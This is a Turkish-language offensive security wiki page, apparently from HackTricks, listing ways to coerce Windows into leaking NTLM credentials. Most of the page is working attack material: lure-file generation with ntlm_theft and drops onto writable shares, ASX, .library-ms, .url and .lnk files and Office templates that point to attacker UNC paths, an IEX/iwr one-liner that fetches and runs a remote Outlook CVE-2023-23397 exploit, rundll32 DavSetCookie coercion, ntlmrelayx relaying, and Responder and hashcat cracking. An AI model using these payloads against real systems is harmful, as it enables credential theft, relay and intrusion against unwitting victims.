# NTLM kimlik bilgilerini çalınabilecek yerler

{{#include ../../banners/hacktricks-training.md}}

**Microsoft Word dosyasını çevrimiçi indirmekten NTLM leak kaynaklarına kadar harika fikirlerin tümünü inceleyin: https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/ ve https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md; ayrıca https://github.com/p0dalirius/windows-coerced-authentication-methods**<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

### Yazılabilir SMB paylaşımı + Explorer tarafından tetiklenen UNC tuzakları (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

**Kullanıcıların veya zamanlanmış görevlerin Explorer'da gezindiği bir paylaşıma yazabiliyorsanız**, meta verileri sizin UNC yolunuza (ör. `\\ATTACKER\share`) işaret eden dosyalar bırakın. Klasörün görüntülenmesi **örtük SMB kimlik doğrulamasını** tetikler ve dinleyicinize bir **NetNTLMv2** sızdırır.<sup>[[1]](#references)</sup>

1. **Tuzaklar oluşturun** (SCF/URL/LNK/library-ms/desktop.ini/Office/RTF vb. kapsar)

```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```

2. **Yazılabilir paylaşıma bırakın** (kurbanın açtığı herhangi bir klasör):

```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```

3. **Dinle ve crackle**:

```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```

Windows aynı anda birkaç dosyaya erişebilir; Explorer'ın önizlediği her şey (`BROWSE TO FOLDER`) tıklama gerektirmez.

### Windows Media Player çalma listeleri (.ASX/.WAX)

Hedefin denetiminizdeki bir Windows Media Player çalma listesini açmasını veya önizlemesini sağlayabilirseniz, girdiyi bir UNC path'e yönlendirerek Net-NTLMv2 sızdırabilirsiniz. WMP, başvurulan medyayı SMB üzerinden almaya çalışır ve otomatik olarak kimlik doğrulaması yapar.<sup>[[3]](#references)[[4]](#references)</sup>

Örnek payload:

```xml
<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>
```

Toplama ve cracking akışı:

```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

### ZIP içine gömülü .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer, ZIP arşivinin içinden doğrudan açıldıklarında .library-ms dosyalarını güvenli olmayan şekilde işler. Library tanımı uzak bir UNC path'e (ör. \\attacker\share) işaret ediyorsa, ZIP içindeki .library-ms dosyasına göz atmak/açmak Explorer'ın UNC'yi listelemesine ve saldırgana NTLM kimlik doğrulaması göndermesine neden olur. Böylece çevrimdışı olarak kırılabilen veya potansiyel olarak relay edilebilen bir NetNTLMv2 elde edilir.<sup>[[2]](#references)</sup>

Saldırganın UNC path'ine işaret eden minimal .library-ms dosyası

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <version>6</version>
  <name>Company Documents</name>
  <isLibraryPinned>false</isLibraryPinned>
  <iconReference>shell32.dll,-235</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.14.2\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

İşlemsel adımlar
- Yukarıdaki XML ile .library-ms dosyasını oluşturun (IP/hostname değerinizi girin).
- Dosyayı ZIP’leyin (Windows’ta: Gönder → Sıkıştırılmış (ziplenmiş) klasör) ve ZIP’i hedefe iletin.
- Bir NTLM capture listener çalıştırın ve kurbanın ZIP’in içinden .library-ms dosyasını açmasını bekleyin.


### Outlook takvim hatırlatıcısı ses yolu (CVE-2023-23397) – sıfır tıklamayla Net-NTLMv2 leak

Microsoft Outlook for Windows, takvim öğelerindeki genişletilmiş MAPI özelliği PidLidReminderFileParameter'ı işliyordu. Bu özellik bir UNC yolunu (ör. \\attacker\share\alert.wav) gösteriyorsa Outlook, hatırlatıcı tetiklendiğinde SMB paylaşımına bağlanarak kullanıcının Net-NTLMv2 değerini hiçbir tıklama olmadan leak ediyordu. Bu açık 14 Mart 2023'te yamalandı, ancak eski/güncellenmemiş filolar ve geçmişe dönük olay müdahalesi için hâlâ oldukça önemlidir.<sup>[[5]](#references)</sup>

PowerShell ile hızlı exploitation (Outlook COM):

```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```

Listener tarafı:

```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```

Notlar
- Kurbanın yalnızca hatırlatıcı tetiklendiğinde Outlook for Windows çalıştırıyor olması gerekir.
- leak, çevrimdışı cracking veya relay için uygun Net-NTLMv2 sağlar (pass-the-hash değil).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – CVE‑2025‑24054 bypass)

Windows Explorer kısayol simgelerini otomatik olarak görüntüler. Son araştırmalar, Microsoft’un UNC simgeli kısayollar için Nisan 2025’te yayımladığı yamadan sonra bile kısayol hedefi UNC path üzerinde barındırılıp simge yerel tutulduğunda, tıklama olmadan NTLM authentication tetiklenebildiğini gösterdi (yama atlatma CVE‑2025‑50154 olarak atandı). Klasörü yalnızca görüntülemek, Explorer’ın uzak hedeften metadata almasına ve saldırganın SMB server’ına NTLM göndermesine neden olur.<sup>[[6]](#references)</sup>

Minimal Internet Shortcut payload (.url):

```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```

PowerShell ile Program Kısayolu payload'ı (.lnk):

```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```

Delivery fikirleri
- Kısayolu bir ZIP dosyasına koyun ve kurbanın dosyaya göz atmasını sağlayın.
- Kısayolu, kurbanın açacağı yazılabilir bir paylaşıma yerleştirin.
- Explorer öğeleri önizleyebilsin diye aynı klasöre başka yem dosyaları da ekleyin.

### Tıklama gerektirmeyen .LNK NTLM leak'i: ExtraData simge yolu (CVE‑2026‑25185)

Windows, `.lnk` meta verilerini yalnızca çalıştırma sırasında değil, **görünüm/önizleme** sırasında da yükler (simgeyi oluştururken). CVE‑2026‑25185, **ExtraData** bloklarının kabuğun bir simge yolunu çözümlemesine ve yükleme **sırasında** dosya sistemine erişmesine neden olduğu bir ayrıştırma yolunu gösteriyor. Yol uzak bir konumdaysa bu işlem giden NTLM trafiği oluşturuyor.

Temel tetikleme koşulları (`CShellLink::_LoadFromStream` içinde gözlemlendi):
- ExtraData içine **DARWIN_PROPS** (`0xa0000006`) ekleyin (simge güncelleme yordamına geçiş koşulu).
- **TargetUnicode** alanı doldurulmuş **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) ekleyin.
- Yükleyici, `TargetUnicode` içindeki ortam değişkenlerini genişletir ve ortaya çıkan yol için `PathFileExistsW` çağrısı yapar.

`TargetUnicode` bir UNC yoluna çözülürse (ör. `\\attacker\share\icon.ico`), kısayolun bulunduğu klasörü **yalnızca görüntülemek** bile giden kimlik doğrulamasına neden olur. Aynı yükleme yolu **dizin oluşturma** ve **AV taraması** sırasında da tetiklenebilir; bu da burayı pratik bir tıklama gerektirmeyen leak yüzeyi hâline getirir.<sup>[[7]](#references)</sup>

Bu yapıları Windows GUI kullanmadan oluşturmak/incelemek için araştırma araçları (ayrıştırıcı/oluşturucu/UI), **LnkMeMaybe** projesinde bulunabilir.<sup>[[8]](#references)</sup>


### `davclnt.dll,DavSetCookie` ile WebDAV kimlik doğrulamasını zorlama / kimlik bilgisi doğrulama

Yerleşik **WebDAV client**, geçerli oturum açma oturumunu rastgele bir **HTTP/WebDAV** uç noktasına kimlik doğrulamaya zorlamak için kötüye kullanılabilir:

```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```

Neden kullanışlı:
- **Saldırganın kontrolündeki bir WebDAV sunucusuna** karşı, özel bir istemci yüklemeden **HTTP üzerinden NTLM** tetikleyebilir.
- **İç ağdaki hostlara** karşı, yatay hareket etmeden önce çalınan kimlik bilgilerinin nerelerde kabul edildiğini **sessizce doğrulamanın** bir yoludur.<sup>[[9]](#references)</sup>
- **SMB çıkışı filtrelenmiş**, ancak **HTTP/WebDAV** erişilebilir durumdaysa bu komut iyi bir alternatiftir.

Operasyonel notlar:
- Kaynak hostta **WebClient** hizmeti çalışıyor olmalıdır.
- `rundll32.exe`, `davclnt.dll` dosyasını yükler ve Windows'un WebDAV kimlik doğrulamasını **geçerli kullanıcının kimlik bilgileriyle** gerçekleştirmesini sağlar.<sup>[[10]](#references)</sup>
- Komutu kontrol ettiğiniz bir altyapıya yönlendiriyorsanız şu gibi NTLM destekli bir HTTP listener/relay kullanın:

```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```

Tespit açısından, çok sayıda iç sisteme karşı tekrarlanan `rundll32.exe davclnt.dll,DavSetCookie` çalıştırmaları, normal kullanıcı davranışından ziyade **kimlik bilgisi doğrulama / spray benzeri yanal hareket hazırlığı** için güçlü bir göstergedir.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) ile NTLM'i zorlamak

Office belgeleri harici bir şablona başvurabilir. Ekli şablonu bir UNC yoluna ayarlarsanız belge açıldığında SMB üzerinden kimlik doğrulaması yapılır.

DOCX ilişkisinde yapılacak en basit değişiklikler (word/ içinde):

1) word/settings.xml dosyasını düzenleyip ekli şablon başvurusunu ekleyin:

```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```

2) word/_rels/settings.xml.rels dosyasını düzenleyin ve rId1337'yi UNC'nize yönlendirin:

```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```

3) .docx olarak yeniden paketleyip teslim edin. SMB capture listener'ınızı çalıştırın ve dosyanın açılmasını bekleyin.

NTLM'i relay etme veya kötüye kullanma sonrası fikirler için şunlara göz atın:

{{#ref}}
README.md
{{#endref}}


## References
- [1] [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)
- [12] [osandamalith.com - Places Of Interest In Stealing Netntlm Hashes](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes)
- [13] [soufianetahiri/TeamsNTLMLeak](https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md)
- [14] [p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)


{{#include ../../banners/hacktricks-training.md}}
